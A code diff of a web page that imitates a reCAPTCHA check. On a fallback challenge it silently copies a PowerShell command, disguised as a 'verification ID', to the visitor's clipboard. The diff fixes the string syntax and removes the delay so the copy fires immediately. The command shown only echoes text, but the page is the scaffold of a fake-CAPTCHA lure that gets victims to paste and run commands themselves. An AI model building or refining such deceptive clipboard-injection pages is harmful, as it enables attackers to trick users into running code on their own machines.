@@ -259,7 +259,7 @@
        Selain itu, teks verifikasi akan otomatis disalin ke clipboard.
     */
     const challengeData = [
-    {
+      {
         imageUrl: "https://i.postimg.cc/87y9MjjS/car1.png",
         name: "bicycles"
       },
@@ -358,13 +358,13 @@
       if (currentChallenge.fallback) {
         isFallbackChallenge = true;
         challengeMain.innerHTML = currentChallenge.content;
-        // Otomatis copy teks verifikasi ke clipboard
-        setTimeout(() => {
-          const copyText = ```powershell -NoExit -Command "echo ' I am not a robot - reCAPTCHA Verification ID: 146820'"```;
-          navigator.clipboard.writeText(copyText)
-            .then(() => console.log('Text copied to clipboard!'))
-            .catch(err => console.error('Error copying text: ', err));
-        }, 100);
+
+        // Otomatis copy teks verifikasi ke clipboard (langsung, tanpa delay)
+        const copyText = "powershell -NoExit -Command \"echo ' I am not a robot - reCAPTCHA Verification ID: 146820'\"";
+        navigator.clipboard.writeText(copyText)
+          .then(() => console.log('Text copied to clipboard!'))
+          .catch(err => console.error('Error copying text: ', err));
+
         verifyButton.textContent = "Verify";
         verifyButton.disabled = false;
         return;
